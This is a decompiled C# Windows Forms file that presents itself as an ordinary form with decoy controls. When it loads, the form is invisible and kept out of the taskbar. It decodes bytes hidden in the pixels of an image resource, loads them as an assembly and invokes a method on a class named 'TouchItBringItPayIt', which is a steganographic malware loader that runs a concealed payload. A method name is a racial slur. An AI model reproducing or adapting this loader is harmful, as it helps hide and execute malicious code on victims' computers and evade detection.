using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ajsyebdmqsk.My.Resources;

namespace ajsyebdmqsk;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		Label1 = new Label();
		LinkLabel1 = new LinkLabel();
		TextBox1 = new TextBox();
		WebBrowser1 = new WebBrowser();
		ListView1 = new ListView();
		NumericUpDown1 = new NumericUpDown();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(271, 41);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Label1");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(160, 142);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(1);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		TextBox textBox = TextBox1;
		location = new Point(134, 49);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(2);
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(122, 101);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(250, 250);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(3);
		ListView listView = ListView1;
		location = new Point(226, 87);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(4);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(19, 18);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(5);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(459, 156);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public char bang(int jj)
	{
		return Strings.Chr(jj);
	}

	public string yo_nigga(Bitmap BMP)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Bitmap val = new Bitmap((Image)(object)BMP, ((Image)BMP).get_Width(), ((Image)BMP).get_Height());
		string text = "";
		checked
		{
			int num = ((Image)BMP).get_Height() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)BMP).get_Width() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = val.GetPixel(j, i);
					text = text + Conversions.ToString(bang(pixel.R)) + Conversions.ToString(bang(pixel.G)) + Conversions.ToString(bang(pixel.B));
				}
			}
			return text;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Assembly assembly = Assembly.Load(Encoding.Default.GetBytes(yo_nigga(Resources.fffffff)));
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType("Dll.TouchItBringItPayIt")));
		NewLateBinding.LateCall(objectValue, (Type)null, "technologic", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	public int NodeSelect(string slctNodes)
	{
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		try
		{
			WebBrowser1.get_Document().GetElementById("fname").SetAttribute("value", TextBox1.get_Text());
			WebBrowser1.get_Document().GetElementById("go").InvokeMember("submit");
			WebBrowser1.get_Document().GetElementById("go").InvokeMember("click");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(WebBrowser1.get_Url().ToString());
		XmlNodeList xmlNodeList = xmlDocument.SelectNodes(slctNodes);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = xmlNodeList.GetEnumerator();
			while (enumerator.MoveNext())
			{
				XmlNode xmlNode = (XmlNode)enumerator.Current;
				string innerText = xmlNode.SelectSingleNode("ChildNode1")!.InnerText;
				string innerText2 = xmlNode.SelectSingleNode("ChildNode2")!.InnerText;
				string innerText3 = xmlNode.SelectSingleNode("ChildNode3")!.InnerText;
				string innerText4 = xmlNode.SelectSingleNode("ChildNode4")!.InnerText;
				string innerText5 = xmlNode.SelectSingleNode("ChildNode5")!.InnerText;
				ListViewItem val = new ListViewItem();
				val.set_Text(innerText);
				val.get_SubItems().Add(innerText2);
				val.get_SubItems().Add(innerText3);
				val.get_SubItems().Add(innerText4);
				val.get_SubItems().Add(innerText5);
				ListView1.get_Items().Add(val);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return xmlNodeList.Count;
	}
}
